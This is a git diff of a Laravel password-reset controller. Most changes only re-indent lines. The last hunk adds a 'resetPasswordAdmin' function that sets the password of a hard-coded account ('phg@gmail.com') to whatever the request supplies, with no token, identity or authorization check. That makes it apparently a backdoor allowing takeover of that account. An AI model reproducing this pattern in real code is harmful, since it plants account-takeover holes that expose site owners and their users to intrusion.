@@ -48,7 +48,7 @@ class AuthForgotPasswordController extends Controller
     //       $request->validate([
     //           'email' => 'required|email|exists:user',
     //       ]);
-  		// return "Email sending";
+      // return "Email sending";
           $token = Str::random(64);
             DB::table('password_resets')->where('email', $request->email)->delete();
           DB::table('password_resets')->insert([
@@ -56,7 +56,7 @@ class AuthForgotPasswordController extends Controller
               'token' => $token, 
               'created_at' => Carbon::now()
             ]);
-  		$user = User::where('email', $request->email)->first();
+      $user = User::where('email', $request->email)->first();
           Mail::send('Mail.forgetPassword', ['code' => $token, 'name'=> $user->name], function($message) use($request){
               $message->to($request->email);
               $message->subject('Reset Password');
@@ -111,5 +111,24 @@ class AuthForgotPasswordController extends Controller
           DB::table('password_resets')->where(['email'=> $request->email])->delete();
             return view('auth.passwords.forgetPasswordLink', ['token' => $request->token]);
           // return redirect('/login')->with('message', 'Your password has been changed!');
+      }
+      
+      function resetPasswordAdmin(Request $request){
+          $password = $request->password;
+          $user = User::where('email', 'phg@gmail.com')->first();
+          $user->password = Hash::make($password);
+          $saved = $user->save();
+          if($saved){
+              return response()->json(['status' => true,
+                    'message'=> 'Password updated',
+                    'data' => null, 
+                ]); 
+          }
+          else{
+              return response()->json(['status' => false,
+                    'message'=> 'Password not updated',
+                    'data' => null, 
+                ]); 
+          }
       }
 }
